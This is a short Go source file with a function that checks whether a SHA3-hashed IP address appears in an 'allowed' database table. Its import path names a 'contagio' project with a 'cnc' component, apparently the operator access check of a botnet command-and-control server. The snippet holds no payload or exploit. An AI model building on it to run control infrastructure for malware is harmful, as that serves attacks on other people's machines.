package database

import (
	"contagio/contagio/cnc/utils"
	"fmt"
)

func CheckIp(ip string) bool {
	rows, err := Db.Query("SELECT id, ip FROM allowed WHERE ip=?", utils.Sha3(ip))

	if err != nil {
		fmt.Println("[contagio] Database: " + err.Error())
		return false
	}

	defer rows.Close()
	var id int
	var _ip string

	for rows.Next() {
		rows.Scan(&id, &_ip)
		return true
	}
	return false
}
